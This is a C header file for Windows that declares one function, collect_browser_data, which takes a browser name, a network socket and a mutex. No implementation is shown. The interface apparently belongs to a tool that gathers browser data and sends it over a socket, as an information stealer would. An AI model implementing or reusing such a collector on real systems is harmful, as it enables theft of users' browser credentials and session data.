#ifndef BROWSER_H
#define BROWSER_H

#include <windows.h>
#include "utils.h"

void collect_browser_data(const char* browser_name, SOCKET sock, HANDLE mutex);

#endif
